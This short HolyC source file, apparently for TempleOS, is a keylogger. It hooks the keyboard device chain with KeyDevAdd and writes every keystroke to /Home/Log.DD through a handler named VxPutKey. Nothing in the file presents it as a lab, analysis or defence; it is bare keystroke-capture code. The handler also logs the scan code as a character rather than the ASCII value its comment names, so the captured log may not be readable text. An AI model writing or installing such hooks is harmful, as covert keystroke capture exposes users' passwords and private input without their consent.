I64 line = 0; 
U8 *filename = "/Home/Log.DD";

Bool VxPutKey(I64 ch,I64 sc)
{ 
  // ch=ASCII; sc=scan_code
  DocLineWrite(filename, line, MStrPrint("%c", sc));
  line = line + 1;
  return TRUE;
}

Bool VxPutS(U8 *st)
{
  return FALSE;
}

// Write key log to file
CDoc *doc = DocNew(filename);
DocWrite(doc);

// Place hook in stdout chain
KeyDevAdd(&VxPutKey, &VxPutS, 0x20000000, TRUE);
